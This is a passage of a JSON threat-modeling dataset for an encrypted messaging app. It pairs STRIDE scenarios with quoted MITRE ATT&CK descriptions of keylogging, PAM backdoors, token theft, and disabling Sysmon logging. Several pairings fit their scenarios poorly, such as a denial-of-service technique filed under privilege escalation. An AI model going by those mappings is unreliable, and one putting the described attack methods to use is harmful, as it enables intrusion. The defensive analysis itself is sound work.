                "description": "Adversaries may log user keystrokes to intercept credentials as the user types them. Keylogging is likely to be used to acquire credentials for new access opportunities when [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) efforts are not effective, and may require an adversary to intercept keystrokes on a system for a substantial period of time before credentials can be successfully captured. In order to increase the likelihood of capturing credentials quickly, an adversary may also perform actions such as clearing browser cookies to force users to reauthenticate to systems.(Citation: Talos Kimsuky Nov 2021)\n\nKeylogging is the most prevalent type of input capture, with many different ways of intercepting keystrokes.(Citation: Adventures of a Keystroke) Some methods include:\n\n* Hooking API callbacks used for processing keystrokes. Unlike [Credential API Hooking](https://attack.mitre.org/techniques/T1056/004), this focuses solely on API functions intended for processing keystroke data.\n* Reading raw keystroke data from the hardware buffer.\n* Windows Registry modifications.\n* Custom drivers.\n* [Modify System Image](https://attack.mitre.org/techniques/T1601) may provide adversaries with hooks into the operating system of network devices to read raw keystrokes for login sessions.(Citation: Cisco Blog Legacy Device Attacks) ",
                "id": "attack-pattern--09a60ea3-a8d1-4ae5-976e-5783248b72a4",
                "technique_id": "T1056.001"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A legitimate user exploits weak verification processes to deny ownership of controversial or illegal messages they sent.",
            "Assumptions": [
                {
                    "Assumption": "Verification processes are weak or have loopholes that can be exploited.",
                    "Role": "Application Developer",
                    "Condition": "Valid when two-factor authentication or similar verification measures are poorly implemented."
                },
                {
                    "Assumption": "Users understand how to manipulate verification processes to support their claims.",
                    "Role": "User",
                    "Condition": "Valid if malicious users are knowledgeable about system flaws."
                }
            ],
            "Potential Impact": "Compromise of Accountability.",
            "MITRE ATT&CK Keywords": [
                "account",
                "verification bypass",
                "repudiation",
                "user manipulation"
            ],
            "mitre_technique": {
                "name": "Pluggable Authentication Modules",
                "description": "Adversaries may modify pluggable authentication modules (PAM) to access user credentials or enable otherwise unwarranted access to accounts. PAM is a modular system of configuration files, libraries, and executable files which guide authentication for many services. The most common authentication module is <code>pam_unix.so</code>, which retrieves, sets, and verifies account authentication information in <code>/etc/passwd</code> and <code>/etc/shadow</code>.(Citation: Apple PAM)(Citation: Man Pam_Unix)(Citation: Red Hat PAM)\n\nAdversaries may modify components of the PAM system to create backdoors. PAM components, such as <code>pam_unix.so</code>, can be patched to accept arbitrary adversary supplied values as legitimate credentials.(Citation: PAM Backdoor)\n\nMalicious modifications to the PAM system may also be abused to steal credentials. Adversaries may infect PAM resources with code to harvest user credentials, since the values exchanged with PAM components may be plain-text since PAM does not store passwords.(Citation: PAM Creds)(Citation: Apple PAM)",
                "id": "attack-pattern--06c00069-771a-4d57-8ef5-d3718c1a8771",
                "technique_id": "T1556.003"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker monitors unencrypted metadata, such as timestamps and contact details, from end-to-end encrypted messages.",
            "Assumptions": [
                {
                    "Assumption": "End-to-end encryption does not protect all metadata.",
                    "Role": "Application Developer",
                    "Condition": "Valid when metadata is not fully encrypted."
                },
                {
                    "Assumption": "Attackers can access network traffic where unencrypted metadata is exposed.",
                    "Role": "Attacker",
                    "Condition": "Valid in an untrusted or compromised network environment."
                }
            ],
            "Potential Impact": "Compromise of Confidentiality.",
            "MITRE ATT&CK Keywords": [
                "metadata",
                "network",
                "surveillance",
                "eavesdropping"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "A backup function accidentally includes decrypted message data due to incorrect implementation, potentially exposing sensitive information.",
            "Assumptions": [
                {
                    "Assumption": "Backup functions are not rigorously tested for security flaws.",
                    "Role": "Application Developer",
                    "Condition": "Valid if development and QA processes are weak."
                },
                {
                    "Assumption": "Users enable backup without understanding its implications.",
                    "Role": "User",
                    "Condition": "Valid when users lack guidance on secure backup practices."
                }
            ],
            "Potential Impact": "Compromise of Confidentiality.",
            "MITRE ATT&CK Keywords": [
                "backup",
                "data leakage",
                "misconfiguration",
                "information disclosure"
            ],
            "mitre_technique": {
                "name": "Direct Volume Access",
                "description": "Adversaries may directly access a volume to bypass file access controls and file system monitoring. Windows allows programs to have direct access to logical volumes. Programs with direct access may read and write files directly from the drive by analyzing file system data structures. This technique may bypass Windows file access controls as well as file system monitoring tools. (Citation: Hakobyan 2009)\n\nUtilities, such as `NinjaCopy`, exist to perform these actions in PowerShell.(Citation: Github PowerSploit Ninjacopy) Adversaries may also use built-in or third-party utilities (such as `vssadmin`, `wbadmin`, and [esentutl](https://attack.mitre.org/software/S0404)) to create shadow copies or backups of data from system volumes.(Citation: LOLBAS Esentutl)",
                "id": "attack-pattern--0c8ab3eb-df48-4b9c-ace7-beacaac81cc5",
                "technique_id": "T1006"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker gains unauthorized access to the encrypted SQLite database storing message pre-keys but weak database encryption techniques make it possible to decrypt.",
            "Assumptions": [
                {
                    "Assumption": "Database encryption uses weak or outdated algorithms.",
                    "Role": "Application Developer",
                    "Condition": "Valid when strong encryption standards are not adhered to."
                },
                {
                    "Assumption": "Attacker has sufficient computing resources to attempt decryption.",
                    "Role": "Attacker",
                    "Condition": "Valid when attackers can access powerful decryption tools."
                }
            ],
            "Potential Impact": "Compromise of Confidentiality.",
            "MITRE ATT&CK Keywords": [
                "database",
                "decryption",
                "sqlite",
                "information disclosure"
            ],
            "mitre_technique": {
                "name": "Data from Local System",
                "description": "Adversaries may search local system sources, such as file systems and configuration files or local databases, to find files of interest and sensitive data prior to Exfiltration.\n\nAdversaries may do this using a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059), such as [cmd](https://attack.mitre.org/software/S0106) as well as a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008), which have functionality to interact with the file system to gather information.(Citation: show_run_config_cmd_cisco) Adversaries may also use [Automated Collection](https://attack.mitre.org/techniques/T1119) on the local system.\n",
                "id": "attack-pattern--3c4a2599-71ee-4405-ba1e-0e28414b4bc5",
                "technique_id": "T1005"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker uses a botnet to flood the messaging service with excessive traffic, rendering it unusable for legitimate users.",
            "Assumptions": [
                {
                    "Assumption": "The service lacks robust anti-DDoS protections.",
                    "Role": "Service Provider",
                    "Condition": "Valid when network resources and filters are insufficient to handle high traffic."
                },
                {
                    "Assumption": "The attacker can mobilize a large number of compromised devices.",
                    "Role": "Attacker",
                    "Condition": "Valid if the attacker controls a botnet."
                }
            ],
            "Potential Impact": "Compromise of Availability.",
            "MITRE ATT&CK Keywords": [
                "botnet",
                "ddos",
                "network",
                "denial of service"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker exploits a vulnerability in the desktop client's code, causing it to crash upon receiving specially crafted messages.",
            "Assumptions": [
                {
                    "Assumption": "Vulnerabilities exist within the desktop client application code.",
                    "Role": "Developer",
                    "Condition": "Valid if the application contains unpatched exploits."
                },
                {
                    "Assumption": "The attacker can send messages to the target client.",
                    "Role": "Attacker",
                    "Condition": "Valid if the attacker can obtain the necessary addresses or identifiers."
                }
            ],
            "Potential Impact": "Compromise of Availability.",
            "MITRE ATT&CK Keywords": [
                "vulnerability",
                "exploit",
                "client",
                "denial of service"
            ],
            "mitre_technique": {
                "name": "Application or System Exploitation",
                "description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ",
                "id": "attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0",
                "technique_id": "T1499.004"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Malware on the primary device causes it to consume excessive resources, effectively preventing the usage of the messaging application.",
            "Assumptions": [
                {
                    "Assumption": "The device is susceptible to malware infection.",
                    "Role": "User",
                    "Condition": "Valid if anti-malware protections are weak."
                },
                {
                    "Assumption": "The application cannot manage resource spikes efficiently.",
                    "Role": "Application Developer",
                    "Condition": "Valid if memory and process management are inadequate."
                }
            ],
            "Potential Impact": "Compromise of Availability.",
            "MITRE ATT&CK Keywords": [
                "malware",
                "resource exhaustion",
                "device",
                "denial of service"
            ],
            "mitre_technique": {
                "name": "OS Exhaustion Flood",
                "description": "Adversaries may launch a denial of service (DoS) attack targeting an endpoint's operating system (OS). A system's OS is responsible for managing the finite resources as well as preventing the entire system from being overwhelmed by excessive demands on its capacity. These attacks do not need to exhaust the actual resources on a system; the attacks may simply exhaust the limits and available resources that an OS self-imposes.\n\nDifferent ways to achieve this exist, including TCP state-exhaustion attacks such as SYN floods and ACK floods.(Citation: Arbor AnnualDoSreport Jan 2018) With SYN floods, excessive amounts of SYN packets are sent, but the 3-way TCP handshake is never completed. Because each OS has a maximum number of concurrent TCP connections that it will allow, this can quickly exhaust the ability of the system to receive new requests for TCP connections, thus preventing access to any TCP service provided by the server.(Citation: Cloudflare SynFlood)\n\nACK floods leverage the stateful nature of the TCP protocol. A flood of ACK packets are sent to the target. This forces the OS to search its state table for a related TCP connection that has already been established. Because the ACK packets are for connections that do not exist, the OS will have to search the entire state table to confirm that no match exists. When it is necessary to do this for a large flood of packets, the computational requirements can cause the server to become sluggish and/or unresponsive, due to the work it must do to eliminate the rogue ACK packets. This greatly reduces the resources available for providing the targeted service.(Citation: Corero SYN-ACKflood)",
                "id": "attack-pattern--0df05477-c572-4ed6-88a9-47c581f548f7",
                "technique_id": "T1499.001"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker escalates privileges through exploiting unpatched vulnerabilities in the companion device client software.",
            "Assumptions": [
                {
                    "Assumption": "The companion device operates with elevated privileges.",
                    "Role": "Application Developer",
                    "Condition": "Valid if the software does not use least privilege principles."
                },
                {
                    "Assumption": "The client software contains unpatched security flaws.",
                    "Role": "Developer",
                    "Condition": "Valid if vulnerabilities are present and known."
                }
            ],
            "Potential Impact": "Compromise of Confidentiality, Integrity, and Availability.",
            "MITRE ATT&CK Keywords": [
                "vulnerability",
                "exploit",
                "client",
                "elevation of privilege"
            ],
            "mitre_technique": {
                "name": "Application or System Exploitation",
                "description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ",
                "id": "attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0",
                "technique_id": "T1499.004"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker uses social engineering tactics to trick a user into granting them administrative access to their mobile or desktop application.",
            "Assumptions": [
                {
                    "Assumption": "Users are not adequately trained to recognize social engineering attacks.",
                    "Role": "User",
                    "Condition": "Valid if user awareness training is not provided."
                },
                {
                    "Assumption": "The application does not prompt for additional verification for critical actions.",
                    "Role": "Application Developer",
                    "Condition": "Valid if multiple authentication steps are not implemented for sensitive actions."
                }
            ],
            "Potential Impact": "Compromise of Confidentiality, Integrity, and Availability.",
            "MITRE ATT&CK Keywords": [
                "social engineering",
                "user manipulation",
                "privilege escalation",
                "device"
            ],
            "mitre_technique": {
                "name": "Spearphishing Link",
                "description": "Spearphishing with a link is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of links to download malware contained in email, instead of attaching malicious files to the email itself, to avoid defenses that may inspect email attachments. \n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this case, the malicious emails contain links. Generally, the links will be accompanied by social engineering text and require the user to actively click or copy and paste a URL into a browser, leveraging [User Execution](https://attack.mitre.org/techniques/T1204). The visited website may compromise the web browser using an exploit, or the user will be prompted to download applications, documents, zip files, or even executables depending on the pretext for the email in the first place. Adversaries may also include links that are intended to interact directly with an email reader, including embedded images intended to exploit the end system directly or verify the receipt of an email (i.e. web bugs/web beacons). Links may also direct users to malicious applications  designed to [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s, like OAuth tokens, in order to gain access to protected applications and information.(Citation: Trend Micro Pawn Storm OAuth 2017)",
                "id": "attack-pattern--20138b9d-1aac-4a26-8654-a36b6bbf2bba",
                "technique_id": "T1192"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Malware designed to exploit known bugs in the operating system allows attackers to execute arbitrary commands at higher privilege levels on the messaging application.",
            "Assumptions": [
                {
                    "Assumption": "The device and application are not fully up-to-date with security patches.",
                    "Role": "User/Application Developer",
                    "Condition": "Valid when devices or applications are not regularly updated."
                },
                {
                    "Assumption": "OS-level vulnerabilities are exploitable.",
                    "Role": "Attacker",
                    "Condition": "Valid if known bugs in the OS have not been fixed."
                }
            ],
            "Potential Impact": "Compromise of Confidentiality, Integrity, and Availability.",
            "MITRE ATT&CK Keywords": [
                "malware",
                "os vulnerability",
                "privilege escalation",
                "device"
            ],
            "mitre_technique": {
                "name": "Indicator Removal from Tools",
                "description": "If a malicious tool is detected and quarantined or otherwise curtailed, an adversary may be able to determine why the malicious tool was detected (the indicator), modify the tool by removing the indicator, and use the updated version that is no longer detected by the target's defensive systems or subsequent targets that may use similar systems.\n\nA good example of this is when malware is detected with a file signature and quarantined by anti-virus software. An adversary who can determine that the malware was quarantined because of its file signature may use [Software Packing](https://attack.mitre.org/techniques/T1045) or otherwise modify the file so it has a different signature, and then re-use the malware.",
                "id": "attack-pattern--00d0b012-8a03-410e-95de-5826bf542de6",
                "technique_id": "T1066"
            }
        }
    ]
},
{
    "case_number": "13",
    "batch_number": "5",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker creates a malicious application mimicking the legitimate messaging app to steal user credentials.",
            "Assumptions": [
                {
                    "Assumption": "Users download applications from untrustworthy sources.",
                    "Role": "User",
                    "Condition": "Users are not vigilant about source authenticity."
                },
                {
                    "Assumption": "The malicious app looks identical to the legitimate app.",
                    "Role": "Attacker",
                    "Condition": "Attacker has ability to replicate UI and functionality convincingly."
                },
                {
                    "Assumption": "Users have medium technical ability and may not distinguish between authentic and spoofed apps.",
                    "Role": "User",
                    "Condition": "User technical skill level is insufficient to detect discrepancies."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive user information.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "credential harvesting",
                "phishing",
                "identity theft",
                "malware distribution"
            ],
            "mitre_technique": {
                "name": "Malicious File",
                "description": "An adversary may rely upon a user opening a malicious file in order to gain execution. Users may be subjected to social engineering to get them to open a file that will lead to code execution. This user action will typically be observed as follow-on behavior from [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001). Adversaries may use several types of files that require a user to execute them, including .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, and .cpl.\n\nAdversaries may employ various forms of [Masquerading](https://attack.mitre.org/techniques/T1036) and [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027) to increase the likelihood that a user will open and successfully execute a malicious file. These methods may include using a familiar naming convention and/or password protecting the file and supplying instructions to a user on how to open it.(Citation: Password Protected Word Docs) \n\nWhile [Malicious File](https://attack.mitre.org/techniques/T1204/002) frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after [Internal Spearphishing](https://attack.mitre.org/techniques/T1534).",
                "id": "attack-pattern--232b7f21-adf9-4b42-b936-b9d6f7df856e",
                "technique_id": "T1204.002"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker intercepts and replaces the identity key during the linking process between the primary and companion devices.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can intercept communication between devices.",
                    "Role": "Attacker",
                    "Condition": "Attacker has access to the same network."
                },
                {
                    "Assumption": "Users do not verify identity keys meticulously.",
                    "Role": "User",
                    "Condition": "User assumes process is automated and secure."
                },
                {
                    "Assumption": "Cryptographic protocols are susceptible to interception attacks during the setup phase.",
                    "Role": "System",
                    "Condition": "Encryption protocols are vulnerable in initial setup."
                }
            ],
            "Potential Impact": "Compromise of message confidentiality and integrity.",
            "MITRE ATT&CK Keywords": [
                "spoofing attack",
                "MITM",
                "identity key interception",
                "network infiltration",
                "encryption bypass"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker uses a compromised secondary device to impersonate the user and access secure messaging.",
            "Assumptions": [
                {
                    "Assumption": "The secondary device has been compromised.",
                    "Role": "Attacker",
                    "Condition": "Attacker has already gained access to the device."
                },
                {
                    "Assumption": "The security protocols do not detect the compromised device.",
                    "Role": "System",
                    "Condition": "System lacks anomaly detection for device behavior."
                },
                {
                    "Assumption": "Users rely heavily on companion devices for communication.",
                    "Role": "User",
                    "Condition": "Users use companion devices regularly."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive communications.",
            "MITRE ATT&CK Keywords": [
                "device compromise",
                "impersonation",
                "session hijacking",
                "credential theft",
                "identity spoofing"
            ],
            "mitre_technique": {
                "name": "Token Impersonation/Theft",
                "description": "Adversaries may duplicate then impersonate another user's existing token to escalate privileges and bypass access controls. For example, an adversary can duplicate an existing token using `DuplicateToken` or `DuplicateTokenEx`.(Citation: DuplicateToken function) The token can then be used with `ImpersonateLoggedOnUser` to allow the calling thread to impersonate a logged on user's security context, or with `SetThreadToken` to assign the impersonated token to a thread.\n\nAn adversary may perform [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001) when they have a specific, existing process they want to assign the duplicated token to. For example, this may be useful for when the target user has a non-network logon session on the system.\n\nWhen an adversary would instead use a duplicated token to create a new process rather than attaching to an existing process, they can additionally [Create Process with Token](https://attack.mitre.org/techniques/T1134/002) using `CreateProcessWithTokenW` or `CreateProcessAsUserW`. [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001) is also distinct from [Make and Impersonate Token](https://attack.mitre.org/techniques/T1134/003) in that it refers to duplicating an existing token, rather than creating a new one.",
                "id": "attack-pattern--86850eff-2729-40c3-b85e-c4af26da4a2d",
                "technique_id": "T1134.001"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies the mobile app to include malicious code to intercept and forward messages.",
            "Assumptions": [
                {
                    "Assumption": "Users install applications from unofficial sources.",
                    "Role": "User",
                    "Condition": "Users are not discerning about application's authenticity."
                },
                {
                    "Assumption": "The malicious code can run undetected.",
                    "Role": "Attacker",
                    "Condition": "Attacker ensures code is stealthy."
                },
                {
                    "Assumption": "App updates do not verify the integrity of previously installed components.",
                    "Role": "System",
                    "Condition": "Update mechanism does not check for tampering."
                }
            ],
            "Potential Impact": "Loss of message integrity and confidentiality.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "code injection",
                "data interception",
                "mobile device compromise",
                "malware"
            ],
            "mitre_technique": {
                "name": "Indicator Removal from Tools",
                "description": "If a malicious tool is detected and quarantined or otherwise curtailed, an adversary may be able to determine why the malicious tool was detected (the indicator), modify the tool by removing the indicator, and use the updated version that is no longer detected by the target's defensive systems or subsequent targets that may use similar systems.\n\nA good example of this is when malware is detected with a file signature and quarantined by anti-virus software. An adversary who can determine that the malware was quarantined because of its file signature may use [Software Packing](https://attack.mitre.org/techniques/T1045) or otherwise modify the file so it has a different signature, and then re-use the malware.",
                "id": "attack-pattern--00d0b012-8a03-410e-95de-5826bf542de6",
                "technique_id": "T1066"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker manipulates stored SQLite databases containing authentication credentials on the device to gain unauthorized access.",
            "Assumptions": [
                {
                    "Assumption": "The device storage is accessible through physical or remote means.",
                    "Role": "Attacker",
                    "Condition": "Attacker has either physical access or remote access to the device."
                },
                {
                    "Assumption": "Credentials stored in the SQLite database are inadequately protected.",
                    "Role": "System",
                    "Condition": "Storage encryption is weak or not implemented."
                },
                {
                    "Assumption": "Users do not frequently monitor or audit device storage.",
                    "Role": "User",
                    "Condition": "Users are unaware of storage tampering."
                }
            ],
            "Potential Impact": "Unauthorized access to user accounts and data.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "database manipulation",
                "credential theft",
                "device compromise",
                "data integrity violation"
            ],
            "mitre_technique": {
                "name": "Disable or Modify Tools",
                "description": "Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.(Citation: SCADAfence_ransomware)\n\nAdversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to [Indicator Blocking](https://attack.mitre.org/techniques/T1562/006), adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection.(Citation: OutFlank System Calls)(Citation: MDSec System Calls) \n\nAdversaries may also focus on specific applications such as Sysmon. For example, the \u201cStart\u201d and \u201cEnable\u201d values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational</code> may be modified to tamper with and potentially disable Sysmon logging.(Citation: disable_win_evt_logging) \n\nOn network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.(Citation: Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation)(Citation: Analysis of FG-IR-22-369)\n\nIn cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.\n\nFurthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools.(Citation: chasing_avaddon_ransomware)(Citation: dharma_ransomware)(Citation: demystifying_ryuk)(Citation: doppelpaymer_crowdstrike) For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.(Citation: demystifying_ryuk)\n\nAdditionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068)), which may lead to bypassing anti-tampering features.(Citation: avoslocker_ransomware)",
                "id": "attack-pattern--ac08589e-ee59-4935-8667-d845e38fe579",
                "technique_id": "T1562.001"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker exploits vulnerabilities in the encryption protocols to alter messages in transit.",
            "Assumptions": [
                {
                    "Assumption": "There are known or zero-day vulnerabilities in the encryption protocol.",
                    "Role": "Attacker",
                    "Condition": "Protocol vulnerabilities are identified and exploited by the attacker."
                },
                {
                    "Assumption": "The attacker has access to the communication channel between sender and recipient.",
                    "Role": "Attacker",
                    "Condition": "Attacker intercepts communication channel."
                },
                {
                    "Assumption": "Messages are not authenticated before encryption.",
                    "Role": "System",
                    "Condition": "Encryption protocol lacks strong message authentication."
                }
            ],
            "Potential Impact": "Message tampering leading to misinformation or miscommunication.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "protocol exploitation",
                "message alteration",
                "MITM",
                "communication interference"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of 